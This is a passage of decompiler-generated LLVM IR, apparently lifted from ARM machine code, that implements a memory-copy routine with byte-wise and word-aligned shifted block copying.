  %v0_1d29c = phi i32 [ %v0_1d29c.pre, %.thread66 ], [ %v2_1d2ec, %.thread72 ], [ %v1_1d27c, %dec_label_pc_1d27c ], [ %v2_1d210, %bb79 ], [ %v0_1d29c5, %dec_label_pc_1d44c ], [ %v0_1d29c4, %dec_label_pc_1d3e0 ], [ %v0_1d29c3, %dec_label_pc_1d374 ], [ %v4_1d298, %bb83 ]
  %v1_1d29c = add i32 %v0_1d29c, 4
  store i32 %v1_1d29c, i32* %r2.global-to-local, align 4
  %v3_1d29c = sub i32 0, %v0_1d29c
  %v4_1d29c = and i32 %v1_1d29c, %v3_1d29c
  %v5_1d29c = icmp slt i32 %v4_1d29c, 0
  store i1 %v5_1d29c, i1* %cpsr_v.global-to-local, align 1
  %v6_1d29c = icmp slt i32 %v1_1d29c, 0
  store i1 %v6_1d29c, i1* %cpsr_n.global-to-local, align 1
  %v7_1d29c = icmp eq i32 %v1_1d29c, 0
  store i1 %v7_1d29c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1d29c, label %bb85, label %bb84.bb86_crit_edge

bb84.bb86_crit_edge:                              ; preds = %bb84
  %v0_1d2a4.pre = load i32, i32* @r3, align 4
  br label %bb86

bb85:                                             ; preds = %bb84
  %v3_1d2a0 = load i8*, i8** %stack_var_-8, align 4
  %v4_1d2a0 = ptrtoint i8* %v3_1d2a0 to i32
  store i32 %v4_1d2a0, i32* %r0.global-to-local, align 4
  br label %bb86

bb86:                                             ; preds = %bb84.bb86_crit_edge, %bb85
  %v0_1d2a4 = phi i32 [ %v0_1d2a4.pre, %bb84.bb86_crit_edge ], [ %v8_1d20c, %bb85 ]
  call void @__pseudo_cond_branch(i1 %v7_1d29c, i32 %v0_1d2a4)
  %v0_1d2a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1d2a8 = add i32 %v0_1d2a8, -2
  %v3_1d2a8 = sub i32 1, %v0_1d2a8
  %v4_1d2a8 = and i32 %v3_1d2a8, %v0_1d2a8
  %v5_1d2a8 = icmp slt i32 %v4_1d2a8, 0
  store i1 %v5_1d2a8, i1* %cpsr_v.global-to-local, align 1
  %v6_1d2a8 = icmp slt i32 %v1_1d2a8, 0
  store i1 %v6_1d2a8, i1* %cpsr_n.global-to-local, align 1
  %v7_1d2a8 = icmp eq i32 %v0_1d2a8, 2
  store i1 %v7_1d2a8, i1* %cpsr_z.global-to-local, align 1
  %v0_1d2ac = load i32, i32* @r1, align 4
  %v1_1d2ac = inttoptr i32 %v0_1d2ac to i8*
  %v2_1d2ac = load i8, i8* %v1_1d2ac, align 1
  %v5_1d2ac = add i32 %v0_1d2ac, 1
  store i32 %v5_1d2ac, i32* %r1.global-to-local, align 4
  %v2_1d2b0 = load i32, i32* %r0.global-to-local, align 4
  %v3_1d2b0 = inttoptr i32 %v2_1d2b0 to i8*
  store i8 %v2_1d2ac, i8* %v3_1d2b0, align 1
  %v4_1d2b0 = load i32, i32* %r0.global-to-local, align 4
  %v5_1d2b0 = add i32 %v4_1d2b0, 1
  store i32 %v5_1d2b0, i32* %r0.global-to-local, align 4
  %v0_1d2b4 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1d2b4 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1d2b4 = xor i1 %v0_1d2b4, %v1_1d2b4
  br i1 %v2_1d2b4, label %.thread69, label %bb87

bb87:                                             ; preds = %bb86
  %v3_1d2b4 = load i32, i32* %r1.global-to-local, align 4
  %v4_1d2b4 = inttoptr i32 %v3_1d2b4 to i8*
  %v5_1d2b4 = load i8, i8* %v4_1d2b4, align 1
  %v8_1d2b4 = add i32 %v3_1d2b4, 1
  store i32 %v8_1d2b4, i32* %r1.global-to-local, align 4
  %v6_1d2b8 = inttoptr i32 %v5_1d2b0 to i8*
  store i8 %v5_1d2b4, i8* %v6_1d2b8, align 1
  %v7_1d2b8 = load i32, i32* %r0.global-to-local, align 4
  %v8_1d2b8 = add i32 %v7_1d2b8, 1
  store i32 %v8_1d2b8, i32* %r0.global-to-local, align 4
  %v1_1d2bc.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1d2bc.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread69

.thread69:                                        ; preds = %bb86, %bb87
  %v7_1d2c0 = phi i32 [ %v8_1d2b8, %bb87 ], [ %v5_1d2b0, %bb86 ]
  %v2_1d2c0 = phi i1 [ %v2_1d2bc.pre, %bb87 ], [ %v1_1d2b4, %bb86 ]
  %v1_1d2c0 = phi i1 [ %v1_1d2bc.pre, %bb87 ], [ %v0_1d2b4, %bb86 ]
  %v0_1d2bc = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1d2bc = xor i1 %v2_1d2c0, %v1_1d2c0
  %v4_1d2bc = or i1 %v0_1d2bc, %v3_1d2bc
  br i1 %v4_1d2bc, label %.thread70, label %bb88

bb88:                                             ; preds = %.thread69
  %v5_1d2bc = load i32, i32* %r1.global-to-local, align 4
  %v6_1d2bc = inttoptr i32 %v5_1d2bc to i8*
  %v7_1d2bc = load i8, i8* %v6_1d2bc, align 1
  %v10_1d2bc = add i32 %v5_1d2bc, 1
  store i32 %v10_1d2bc, i32* %r1.global-to-local, align 4
  %v8_1d2c0 = inttoptr i32 %v7_1d2c0 to i8*
  store i8 %v7_1d2bc, i8* %v8_1d2c0, align 1
  %v9_1d2c0 = load i32, i32* %r0.global-to-local, align 4
  %v10_1d2c0 = add i32 %v9_1d2c0, 1
  store i32 %v10_1d2c0, i32* %r0.global-to-local, align 4
  br label %.thread70

.thread70:                                        ; preds = %.thread69, %bb88
  %v2_1d2c4 = load i8*, i8** %stack_var_-8, align 4
  %v3_1d2c4 = ptrtoint i8* %v2_1d2c4 to i32
  store i32 %v3_1d2c4, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v8_1d20c)
  %v0_1d2cc.pre = load i32, i32* @ip, align 4
  %v0_1d2d4.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_1d2d8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1d2cc

dec_label_pc_1d2cc:                               ; preds = %dec_label_pc_1d218, %.thread70
  %v2_1d2d8 = phi i32 [ %v1_1d200, %dec_label_pc_1d218 ], [ %v2_1d2d8.pre, %.thread70 ]
  %v0_1d2d4 = phi i32 [ %v0_1d200, %dec_label_pc_1d218 ], [ %v0_1d2d4.pre, %.thread70 ]
  %v0_1d2cc = phi i32 [ %v1_1d218, %dec_label_pc_1d218 ], [ %v0_1d2cc.pre, %.thread70 ]
  %v1_1d2cc = sub i32 4, %v0_1d2cc
  store i32 %v1_1d2cc, i32* @ip, align 4
  %v1_1d2d0 = add i32 %v1_1d2cc, -2
  %v3_1d2d0 = sub i32 1, %v1_1d2cc
  %v4_1d2d0 = and i32 %v3_1d2d0, %v1_1d2cc
  %v5_1d2d0 = icmp slt i32 %v4_1d2d0, 0
  store i1 %v5_1d2d0, i1* %cpsr_v.global-to-local, align 1
  %v6_1d2d0 = icmp slt i32 %v1_1d2d0, 0
  store i1 %v6_1d2d0, i1* %cpsr_n.global-to-local, align 1
  %v7_1d2d0 = icmp eq i32 %v1_1d2cc, 2
  store i1 %v7_1d2d0, i1* %cpsr_z.global-to-local, align 1
  %v1_1d2d4 = inttoptr i32 %v0_1d2d4 to i8*
  %v2_1d2d4 = load i8, i8* %v1_1d2d4, align 1
  %v3_1d2d4 = zext i8 %v2_1d2d4 to i32
  store i32 %v3_1d2d4, i32* @r3, align 4
  %v5_1d2d4 = add i32 %v0_1d2d4, 1
  store i32 %v5_1d2d4, i32* @r1, align 4
  %v3_1d2d8 = inttoptr i32 %v2_1d2d8 to i8*
  store i8 %v2_1d2d4, i8* %v3_1d2d8, align 1
  %v4_1d2d8 = load i32, i32* %r0.global-to-local, align 4
  %v5_1d2d8 = add i32 %v4_1d2d8, 1
  store i32 %v5_1d2d8, i32* %r0.global-to-local, align 4
  %v0_1d2dc = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1d2dc = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1d2dc = xor i1 %v0_1d2dc, %v1_1d2dc
  br i1 %v2_1d2dc, label %.thread71, label %bb89

bb89:                                             ; preds = %dec_label_pc_1d2cc
  %v3_1d2dc = load i32, i32* @r1, align 4
  %v4_1d2dc = inttoptr i32 %v3_1d2dc to i8*
  %v5_1d2dc = load i8, i8* %v4_1d2dc, align 1
  %v6_1d2dc = zext i8 %v5_1d2dc to i32
  store i32 %v6_1d2dc, i32* @r3, align 4
  %v8_1d2dc = add i32 %v3_1d2dc, 1
  store i32 %v8_1d2dc, i32* @r1, align 4
  %v6_1d2e0 = inttoptr i32 %v5_1d2d8 to i8*
  store i8 %v5_1d2dc, i8* %v6_1d2e0, align 1
  %v7_1d2e0 = load i32, i32* %r0.global-to-local, align 4
  %v8_1d2e0 = add i32 %v7_1d2e0, 1
  store i32 %v8_1d2e0, i32* %r0.global-to-local, align 4
  %v1_1d2e4.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1d2e4.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread71

.thread71:                                        ; preds = %dec_label_pc_1d2cc, %bb89
  %v7_1d2e8 = phi i32 [ %v8_1d2e0, %bb89 ], [ %v5_1d2d8, %dec_label_pc_1d2cc ]
  %v2_1d2e8 = phi i1 [ %v2_1d2e4.pre, %bb89 ], [ %v1_1d2dc, %dec_label_pc_1d2cc ]
  %v1_1d2e8 = phi i1 [ %v1_1d2e4.pre, %bb89 ], [ %v0_1d2dc, %dec_label_pc_1d2cc ]
  %v0_1d2e4 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1d2e4 = xor i1 %v2_1d2e8, %v1_1d2e8
  %v4_1d2e4 = or i1 %v0_1d2e4, %v3_1d2e4
  br i1 %v4_1d2e4, label %.thread72, label %bb90

bb90:                                             ; preds = %.thread71
  %v5_1d2e4 = load i32, i32* @r1, align 4
  %v6_1d2e4 = inttoptr i32 %v5_1d2e4 to i8*
  %v7_1d2e4 = load i8, i8* %v6_1d2e4, align 1
  %v8_1d2e4 = zext i8 %v7_1d2e4 to i32
  store i32 %v8_1d2e4, i32* @r3, align 4
  %v10_1d2e4 = add i32 %v5_1d2e4, 1
  store i32 %v10_1d2e4, i32* @r1, align 4
  %v8_1d2e8 = inttoptr i32 %v7_1d2e8 to i8*
  store i8 %v7_1d2e4, i8* %v8_1d2e8, align 1
  %v9_1d2e8 = load i32, i32* %r0.global-to-local, align 4
  %v10_1d2e8 = add i32 %v9_1d2e8, 1
  store i32 %v10_1d2e8, i32* %r0.global-to-local, align 4
  br label %.thread72

.thread72:                                        ; preds = %.thread71, %bb90
  %v0_1d41c21 = phi i32 [ %v10_1d2e8, %bb90 ], [ %v7_1d2e8, %.thread71 ]
  %v0_1d2ec = load i32, i32* %r2.global-to-local, align 4
  %v1_1d2ec = load i32, i32* @ip, align 4
  %v2_1d2ec = sub i32 %v0_1d2ec, %v1_1d2ec
  store i32 %v2_1d2ec, i32* %r2.global-to-local, align 4
  %v4_1d2ec = xor i32 %v1_1d2ec, %v0_1d2ec
  %v5_1d2ec = xor i32 %v2_1d2ec, %v0_1d2ec
  %v6_1d2ec = and i32 %v5_1d2ec, %v4_1d2ec
  %v7_1d2ec = icmp slt i32 %v6_1d2ec, 0
  store i1 %v7_1d2ec, i1* %cpsr_v.global-to-local, align 1
  %v8_1d2ec = icmp slt i32 %v2_1d2ec, 0
  store i1 %v8_1d2ec, i1* %cpsr_n.global-to-local, align 1
  %v9_1d2ec = icmp eq i32 %v0_1d2ec, %v1_1d2ec
  store i1 %v9_1d2ec, i1* %cpsr_z.global-to-local, align 1
  %v2_1d2f0 = xor i1 %v8_1d2ec, %v7_1d2ec
  br i1 %v2_1d2f0, label %bb84, label %dec_label_pc_1d2f4

dec_label_pc_1d2f4:                               ; preds = %.thread72
  %v0_1d2f4 = load i32, i32* @r1, align 4
  %v1_1d2f4 = urem i32 %v0_1d2f4, 4
  store i32 %v1_1d2f4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1d2f4 = icmp eq i32 %v1_1d2f4, 0
  store i1 %v2_1d2f4, i1* %cpsr_z.global-to-local, align 1
  %extract.t73 = trunc i32 %v0_1d2f4 to i2
  br i1 %v2_1d2f4, label %dec_label_pc_1d228, label %dec_label_pc_1d2fc

dec_label_pc_1d2fc:                               ; preds = %dec_label_pc_1d220, %dec_label_pc_1d2f4
  %v0_1d41c20 = phi i32 [ %v1_1d200, %dec_label_pc_1d220 ], [ %v0_1d41c21, %dec_label_pc_1d2f4 ]
  %v0_1d384 = phi i32 [ %v2_1d210, %dec_label_pc_1d220 ], [ %v2_1d2ec, %dec_label_pc_1d2f4 ]
  %v0_1d304.off0 = phi i2 [ %extract.t, %dec_label_pc_1d220 ], [ %extract.t73, %dec_label_pc_1d2f4 ]
  %v0_1d2fc = phi i32 [ %v0_1d200, %dec_label_pc_1d220 ], [ %v0_1d2f4, %dec_label_pc_1d2f4 ]
  %v1_1d2fc = and i32 %v0_1d2fc, -4
  store i32 %v1_1d2fc, i32* %r1.global-to-local, align 4
  %v1_1d300 = inttoptr i32 %v1_1d2fc to i32*
  %v2_1d300 = load i32, i32* %v1_1d300, align 4
  store i32 %v2_1d300, i32* %lr.global-to-local, align 4
  %v4_1d300 = add i32 %v1_1d2fc, 4
  store i32 %v4_1d300, i32* %r1.global-to-local, align 4
  %v1_1d37c = add i32 %v0_1d384, -12
  %v3_1d37c = sub i32 11, %v0_1d384
  %v4_1d37c = and i32 %v3_1d37c, %v0_1d384
  %v5_1d37c = icmp slt i32 %v4_1d37c, 0
  store i1 %v5_1d37c, i1* %cpsr_v.global-to-local, align 1
  %v6_1d37c = icmp slt i32 %v1_1d37c, 0
  store i1 %v6_1d37c, i1* %cpsr_n.global-to-local, align 1
  %v7_1d37c = icmp eq i32 %v0_1d384, 12
  store i1 %v7_1d37c, i1* %cpsr_z.global-to-local, align 1
  %v2_1d380 = xor i1 %v6_1d37c, %v5_1d37c
  switch i2 %v0_1d304.off0, label %dec_label_pc_1d310 [
    i2 -1, label %dec_label_pc_1d3e8
    i2 -2, label %dec_label_pc_1d37c
  ]

dec_label_pc_1d310:                               ; preds = %dec_label_pc_1d2fc
  br i1 %v2_1d380, label %dec_label_pc_1d35c, label %dec_label_pc_1d318

dec_label_pc_1d318:                               ; preds = %dec_label_pc_1d310
  store i32 %v1_1d37c, i32* %r2.global-to-local, align 4
  %v3_1d31c = load i32, i32* @r4, align 4
  store i32 %v3_1d31c, i32* %stack_var_-16, align 4
  %v6_1d31c = load i32, i32* @r5, align 4
  store i32 %v6_1d31c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1d320

dec_label_pc_1d320:                               ; preds = %dec_label_pc_1d320.dec_label_pc_1d320_crit_edge, %dec_label_pc_1d318
  %v0_1d344 = phi i32 [ %v12_1d344, %dec_label_pc_1d320.dec_label_pc_1d320_crit_edge ], [ %v0_1d41c20, %dec_label_pc_1d318 ]
  %v0_1d324 = phi i32 [ %v0_1d324.pre, %dec_label_pc_1d320.dec_label_pc_1d320_crit_edge ], [ %v4_1d300, %dec_label_pc_1d318 ]
  %v0_1d320 = phi i32 [ %v0_1d320.pre, %dec_label_pc_1d320.dec_label_pc_1d320_crit_edge ], [ %v2_1d300, %dec_label_pc_1d318 ]
  %v3_1d320 = udiv i32 %v0_1d320, 256
  %v1_1d324 = inttoptr i32 %v0_1d324 to i32*
  %v2_1d324 = load i32, i32* %v1_1d324, align 4
  store i32 %v2_1d324, i32* %r4.global-to-local, align 4
  %v3_1d324 = add i32 %v0_1d324, 4
  %v4_1d324 = inttoptr i32 %v3_1d324 to i32*
  %v5_1d324 = load i32, i32* %v4_1d324, align 4
  store i32 %v5_1d324, i32* %r5.global-to-local, align 4
  %v6_1d324 = add i32 %v0_1d324, 8
  %v7_1d324 = inttoptr i32 %v6_1d324 to i32*
  %v8_1d324 = load i32, i32* %v7_1d324, align 4
  store i32 %v8_1d324, i32* %ip.global-to-local, align 4
  %v9_1d324 = add i32 %v0_1d324, 12
  %v10_1d324 = inttoptr i32 %v9_1d324 to i32*
  %v11_1d324 = load i32, i32* %v10_1d324, align 4
  store i32 %v11_1d324, i32* %lr.global-to-local, align 4
  %v12_1d324 = add i32 %v0_1d324, 16
  store i32 %v12_1d324, i32* %r1.global-to-local, align 4
  %v4_1d328 = mul i32 %v2_1d324, 16777216
  %v5_1d328 = or i32 %v4_1d328, %v3_1d320
  store i32 %v5_1d328, i32* @r3, align 4
  %v3_1d32c = udiv i32 %v2_1d324, 256
  %v4_1d330 = mul i32 %v5_1d324, 16777216
  %v5_1d330 = or i32 %v4_1d330, %v3_1d32c
  store i32 %v5_1d330, i32* %r4.global-to-local, align 4
  %v3_1d334 = udiv i32 %v5_1d324, 256
  %v4_1d338 = mul i32 %v8_1d324, 16777216
  %v5_1d338 = or i32 %v4_1d338, %v3_1d334
  store i32 %v5_1d338, i32* %r5.global-to-local, align 4
  %v3_1d33c = udiv i32 %v8_1d324, 256
  %v4_1d340 = mul i32 %v11_1d324, 16777216
  %v5_1d340 = or i32 %v4_1d340, %v3_1d33c
  store i32 %v5_1d340, i32* @ip, align 4
  %v1_1d344 = inttoptr i32 %v0_1d344 to i32*
  store i32 %v5_1d328, i32* %v1_1d344, align 4
  %v3_1d344 = add i32 %v0_1d344, 4
  %v4_1d344 = inttoptr i32 %v3_1d344 to i32*
  %v5_1d344 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1d344, i32* %v4_1d344, align 4
  %v6_1d344 = add i32 %v0_1d344, 8
  %v7_1d344 = inttoptr i32 %v6_1d344 to i32*
  %v8_1d344 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1d344, i32* %v7_1d344, align 4
  %v9_1d344 = add i32 %v0_1d344, 12
  %v10_1d344 = inttoptr i32 %v9_1d344 to i32*
  %v11_1d344 = load i32, i32* @ip, align 4
  store i32 %v11_1d344, i32* %v10_1d344, align 4
  %v12_1d344 = add i32 %v0_1d344, 16
  store i32 %v12_1d344, i32* %r0.global-to-local, align 4
  %v0_1d348 = load i32, i32* %r2.global-to-local, align 4
  %v1_1d348 = add i32 %v0_1d348, -16
  store i32 %v1_1d348, i32* %r2.global-to-local, align 4
  %v3_1d348 = sub i32 15, %v0_1d348
  %v4_1d348 = and i32 %v3_1d348, %v0_1d348
  %v5_1d348 = icmp slt i32 %v4_1d348, 0
  %v6_1d348 = icmp slt i32 %v1_1d348, 0
  %v2_1d34c = xor i1 %v6_1d348, %v5_1d348
  br i1 %v2_1d34c, label %dec_label_pc_1d350, label %dec_label_pc_1d320.dec_label_pc_1d320_crit_edge

dec_label_pc_1d320.dec_label_pc_1d320_crit_edge:  ; preds = %dec_label_pc_1d320
  %v0_1d320.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1d324.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1d320

dec_label_pc_1d350:                               ; preds = %dec_label_pc_1d320
  %v2_1d350 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1d350, i32* @r4, align 4
  %v5_1d350 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1d350, i32* @r5, align 4
  %v1_1d354 = add i32 %v0_1d348, -4
  store i32 %v1_1d354, i32* %r2.global-to-local, align 4
  %v3_1d354 = add i32 %v0_1d348, 2147483632
  %v4_1d354 = and i32 %v1_1d354, %v3_1d354
  %v5_1d354 = icmp slt i32 %v4_1d354, 0
  store i1 %v5_1d354, i1* %cpsr_v.global-to-local, align 1
  %v6_1d354 = icmp slt i32 %v1_1d354, 0
  store i1 %v6_1d354, i1* %cpsr_n.global-to-local, align 1
  %v7_1d354 = icmp eq i32 %v1_1d354, 0
  store i1 %v7_1d354, i1* %cpsr_z.global-to-local, align 1
  %v2_1d358 = xor i1 %v6_1d354, %v5_1d354
  br i1 %v2_1d358, label %dec_label_pc_1d374, label %dec_label_pc_1d35c

dec_label_pc_1d35c:                               ; preds = %dec_label_pc_1d350, %dec_label_pc_1d310, %dec_label_pc_1d35c
  %v1_1d368 = phi i32 [ %v4_1d368, %dec_label_pc_1d35c ], [ %v12_1d344, %dec_label_pc_1d350 ], [ %v0_1d41c20, %dec_label_pc_1d310 ]
  %v0_1d35c = load i32, i32* %lr.global-to-local, align 4
  %v3_1d35c = udiv i32 %v0_1d35c, 256
  store i32 %v3_1d35c, i32* %ip.global-to-local, align 4
  %v0_1d360 = load i32, i32* %r1.global-to-local, align 4
  %v1_1d360 = inttoptr i32 %v0_1d360 to i32*
  %v2_1d360 = load i32, i32* %v1_1d360, align 4
  store i32 %v2_1d360, i32* %lr.global-to-local, align 4
  %v4_1d360 = add i32 %v0_1d360, 4
  store i32 %v4_1d360, i32* %r1.global-to-local, align 4
  %v4_1d364 = mul i32 %v2_1d360, 16777216
  %v5_1d364 = or i32 %v4_1d364, %v3_1d35c
  store i32 %v5_1d364, i32* @ip, align 4
  %v2_1d368 = inttoptr i32 %v1_1d368 to i32*
  store i32 %v5_1d364, i32* %v2_1d368, align 4
  %v3_1d368 = load i32, i32* %r0.global-to-local, align 4
  %v4_1d368 = add i32 %v3_1d368, 4
  store i32 %v4_1d368, i32* %r0.global-to-local, align 4
  %v0_1d36c = load i32, i32* %r2.global-to-local, align 4
  %v1_1d36c = add i32 %v0_1d36c, -4
  store i32 %v1_1d36c, i32* %r2.global-to-local, align 4
  %v3_1d36c = sub i32 3, %v0_1d36c
  %v4_1d36c = and i32 %v3_1d36c, %v0_1d36c
  %v5_1d36c = icmp slt i32 %v4_1d36c, 0
  %v6_1d36c = icmp slt i32 %v1_1d36c, 0
  %v2_1d370 = xor i1 %v6_1d36c, %v5_1d36c
  br i1 %v2_1d370, label %dec_label_pc_1d374.loopexit, label %dec_label_pc_1d35c

dec_label_pc_1d374.loopexit:                      ; preds = %dec_label_pc_1d35c
  %v7_1d36c = icmp eq i32 %v0_1d36c, 4
  store i1 %v5_1d36c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_1d36c, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1d36c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1d374

dec_label_pc_1d374:                               ; preds = %dec_label_pc_1d374.loopexit, %dec_label_pc_1d350
  %v0_1d29c3 = phi i32 [ %v1_1d36c, %dec_label_pc_1d374.loopexit ], [ %v1_1d354, %dec_label_pc_1d350 ]
  %v0_1d374 = load i32, i32* %r1.global-to-local, align 4
  %v1_1d374 = add i32 %v0_1d374, -3
  store i32 %v1_1d374, i32* @r1, align 4
  br label %bb84

dec_label_pc_1d37c:                               ; preds = %dec_label_pc_1d2fc
  br i1 %v2_1d380, label %dec_label_pc_1d3c8, label %dec_label_pc_1d384

dec_label_pc_1d384:                               ; preds = %dec_label_pc_1d37c
  store i32 %v1_1d37c, i32* %r2.global-to-local, align 4
  %v3_1d388 = load i32, i32* @r4, align 4
  store i32 %v3_1d388, i32* %stack_var_-16, align 4
  %v6_1d388 = load i32, i32* @r5, align 4
  store i32 %v6_1d388, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1d38c

dec_label_pc_1d38c:                               ; preds = %dec_label_pc_1d38c.dec_label_pc_1d38c_crit_edge, %dec_label_pc_1d384
  %v0_1d3b0 = phi i32 [ %v12_1d3b0, %dec_label_pc_1d38c.dec_label_pc_1d38c_crit_edge ], [ %v0_1d41c20, %dec_label_pc_1d384 ]
  %v0_1d390 = phi i32 [ %v0_1d390.pre, %dec_label_pc_1d38c.dec_label_pc_1d38c_crit_edge ], [ %v4_1d300, %dec_label_pc_1d384 ]
  %v0_1d38c = phi i32 [ %v0_1d38c.pre, %dec_label_pc_1d38c.dec_label_pc_1d38c_crit_edge ], [ %v2_1d300, %dec_label_pc_1d384 ]
  %v3_1d38c = udiv i32 %v0_1d38c, 65536
  %v1_1d390 = inttoptr i32 %v0_1d390 to i32*
  %v2_1d390 = load i32, i32* %v1_1d390, align 4
  store i32 %v2_1d390, i32* %r4.global-to-local, align 4
  %v3_1d390 = add i32 %v0_1d390, 4
  %v4_1d390 = inttoptr i32 %v3_1d390 to i32*
  %v5_1d390 = load i32, i32* %v4_1d390, align 4
  store i32 %v5_1d390, i32* %r5.global-to-local, align 4
  %v6_1d390 = add i32 %v0_1d390, 8
  %v7_1d390 = inttoptr i32 %v6_1d390 to i32*
  %v8_1d390 = load i32, i32* %v7_1d390, align 4
  store i32 %v8_1d390, i32* %ip.global-to-local, align 4
  %v9_1d390 = add i32 %v0_1d390, 12
  %v10_1d390 = inttoptr i32 %v9_1d390 to i32*
  %v11_1d390 = load i32, i32* %v10_1d390, align 4
  store i32 %v11_1d390, i32* %lr.global-to-local, align 4
  %v12_1d390 = add i32 %v0_1d390, 16
  store i32 %v12_1d390, i32* %r1.global-to-local, align 4
  %v4_1d394 = mul i32 %v2_1d390, 65536
  %v5_1d394 = or i32 %v4_1d394, %v3_1d38c
  store i32 %v5_1d394, i32* @r3, align 4
  %v3_1d398 = udiv i32 %v2_1d390, 65536
  %v4_1d39c = mul i32 %v5_1d390, 65536
  %v5_1d39c = or i32 %v4_1d39c, %v3_1d398
  store i32 %v5_1d39c, i32* %r4.global-to-local, align 4
  %v3_1d3a0 = udiv i32 %v5_1d390, 65536
  %v4_1d3a4 = mul i32 %v8_1d390, 65536
  %v5_1d3a4 = or i32 %v4_1d3a4, %v3_1d3a0
  store i32 %v5_1d3a4, i32* %r5.global-to-local, align 4
  %v3_1d3a8 = udiv i32 %v8_1d390, 65536
  %v4_1d3ac = mul i32 %v11_1d390, 65536
  %v5_1d3ac = or i32 %v4_1d3ac, %v3_1d3a8
  store i32 %v5_1d3ac, i32* @ip, align 4
  %v1_1d3b0 = inttoptr i32 %v0_1d3b0 to i32*
  store i32 %v5_1d394, i32* %v1_1d3b0, align 4
  %v3_1d3b0 = add i32 %v0_1d3b0, 4
  %v4_1d3b0 = inttoptr i32 %v3_1d3b0 to i32*
  %v5_1d3b0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1d3b0, i32* %v4_1d3b0, align 4
  %v6_1d3b0 = add i32 %v0_1d3b0, 8
  %v7_1d3b0 = inttoptr i32 %v6_1d3b0 to i32*
  %v8_1d3b0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1d3b0, i32* %v7_1d3b0, align 4
  %v9_1d3b0 = add i32 %v0_1d3b0, 12
  %v10_1d3b0 = inttoptr i32 %v9_1d3b0 to i32*
  %v11_1d3b0 = load i32, i32* @ip, align 4
  store i32 %v11_1d3b0, i32* %v10_1d3b0, align 4
  %v12_1d3b0 = add i32 %v0_1d3b0, 16
  store i32 %v12_1d3b0, i32* %r0.global-to-local, align 4
  %v0_1d3b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1d3b4 = add i32 %v0_1d3b4, -16
  store i32 %v1_1d3b4, i32* %r2.global-to-local, align 4
  %v3_1d3b4 = sub i32 15, %v0_1d3b4
  %v4_1d3b4 = and i32 %v3_1d3b4, %v0_1d3b4
  %v5_1d3b4 = icmp slt i32 %v4_1d3b4, 0
  %v6_1d3b4 = icmp slt i32 %v1_1d3b4, 0
  %v2_1d3b8 = xor i1 %v6_1d3b4, %v5_1d3b4
  br i1 %v2_1d3b8, label %dec_label_pc_1d3bc, label %dec_label_pc_1d38c.dec_label_pc_1d38c_crit_edge

dec_label_pc_1d38c.dec_label_pc_1d38c_crit_edge:  ; preds = %dec_label_pc_1d38c
  %v0_1d38c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1d390.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1d38c

dec_label_pc_1d3bc:                               ; preds = %dec_label_pc_1d38c
  %v2_1d3bc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1d3bc, i32* @r4, align 4
  %v5_1d3bc = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1d3bc, i32* @r5, align 4
  %v1_1d3c0 = add i32 %v0_1d3b4, -4
  store i32 %v1_1d3c0, i32* %r2.global-to-local, align 4
  %v3_1d3c0 = add i32 %v0_1d3b4, 2147483632
  %v4_1d3c0 = and i32 %v1_1d3c0, %v3_1d3c0
  %v5_1d3c0 = icmp slt i32 %v4_1d3c0, 0
  store i1 %v5_1d3c0, i1* %cpsr_v.global-to-local, align 1
  %v6_1d3c0 = icmp slt i32 %v1_1d3c0, 0
  store i1 %v6_1d3c0, i1* %cpsr_n.global-to-local, align 1
  %v7_1d3c0 = icmp eq i32 %v1_1d3c0, 0
  store i1 %v7_1d3c0, i1* %cpsr_z.global-to-local, align 1
  %v2_1d3c4 = xor i1 %v6_1d3c0, %v5_1d3c0
  br i1 %v2_1d3c4, label %dec_label_pc_1d3e0, label %dec_label_pc_1d3c8

dec_label_pc_1d3c8:                               ; preds = %dec_label_pc_1d3bc, %dec_label_pc_1d37c, %dec_label_pc_1d3c8
  %v1_1d3d4 = phi i32 [ %v4_1d3d4, %dec_label_pc_1d3c8 ], [ %v12_1d3b0, %dec_label_pc_1d3bc ], [ %v0_1d41c20, %dec_label_pc_1d37c ]
  %v0_1d3c8 = load i32, i32* %lr.global-to-local, align 4
  %v3_1d3c8 = udiv i32 %v0_1d3c8, 65536
  store i32 %v3_1d3c8, i32* %ip.global-to-local, align 4
  %v0_1d3cc = load i32, i32* %r1.global-to-local, align 4
  %v1_1d3cc = inttoptr i32 %v0_1d3cc to i32*
  %v2_1d3cc = load i32, i32* %v1_1d3cc, align 4
  store i32 %v2_1d3cc, i32* %lr.global-to-local, align 4
  %v4_1d3cc = add i32 %v0_1d3cc, 4
  store i32 %v4_1d3cc, i32* %r1.global-to-local, align 4
